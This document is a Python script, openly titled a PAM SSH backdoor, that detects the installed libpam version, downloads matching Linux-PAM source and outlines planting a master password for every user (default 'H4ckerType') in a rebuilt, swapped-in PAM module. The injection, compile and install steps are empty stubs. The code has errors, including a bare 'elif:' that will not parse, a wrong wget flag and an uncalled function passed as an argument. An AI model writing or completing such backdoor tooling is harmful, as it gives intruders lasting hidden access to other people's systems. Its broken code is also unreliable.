#!/usr/bin/python3
#PAM SSH backdoor
#PASSWORD,no,Master password for any user
#PAM_VERSION,no,Set version of PAM if if you know it
#END

import os
import subprocess

def get_pam_version():
    pam_version = subprocess.check_output("dpkg -l | grep -i libpam-modules", shell=True)
    pam_version = pam_version.decode('utf-8').split()[2]
    return pam_version

def get_pam_source_code(pam_version):
    
    if '1.1.6' in pam_version:
        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/v1.1.6.tar.gz -o /tmp/pam_source_116.tar.gz')
    elif '1.1.7' in pam_version:
        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1_1_7.tar.gz -o /tmp/pam_source_117.tar.gz')
    elif '1.1.8' in pam_version:
        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1_1_8.tar.gz -o /tmp/pam_source_118.tar.gz')
    elif '1.2.0' in pam_version:
        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1_2_0.tar.gz -o /tmp/pam_source_120.tar.gz')
    elif '1.2.1' in pam_version:
        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1_2_1.tar.gz -o /tmp/pam_source_121.tar.gz')
    elif '1.3.0' in pam_version:
        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1.3.0.tar.gz -o /tmp/pam_source_130.tar.gz') 
    elif '1.3.1' in pam_version:
        os.system('wget https://github.com/linux-pam/linux-pam/releases/download/v1.3.1/Linux-PAM-1.3.1.tar.xz -o /tmp/pam_source_131.tar.xz')
    elif '1.4.0' in pam_version:
        os.system('wget https://github.com/linux-pam/linux-pam/releases/download/v1.4.0/Linux-PAM-1.4.0.tar.xz -o /tmp/pam_source_140.tar.xz')
    elif '1.5.0' in pam_version:
        os.system('wget https://github.com/linux-pam/linux-pam/releases/download/v1.5.0/Linux-PAM-1.5.0.tar.xz -o /tmp/pam_source_150.tar.xz')
    elif '1.5.1' in pam_version:
        os.system('wget https://github.com/linux-pam/linux-pam/releases/download/v1.5.1/Linux-PAM-1.5.1.tar.xz -o /tmp/pam_source_151.tar.xz')
    elif: #get latest stable
        pass

def put_backdoor_into_code(password, path_to_source_code):
    pass

def compile_modified_pam(path_to_source_code):
    pass

def create_backup_of_original_pam():
    pass

def copy_backdoored_pam(path_to_backdoored_pam):
    pass

def create_backdoor(password, path_to_source_code):
    if password == "":
        password = "H4ckerType"

    put_backdoor_into_code(password, path_to_source_code)
    compile_modified_pam(path_to_source_code)
    
    pass

def main(arguments):
    if not arguments[1]:
        path_to__source_code = get_pam_source_code(get_pam_version)
    else:
        path_to_source_code = get_pam_source_code(arguments[1])
    
    create_backdoor(arguments[0], path_to_source_code)
    create_backup_of_original_pam()
    copy_backdoored_pam()


print(get_pam_version())
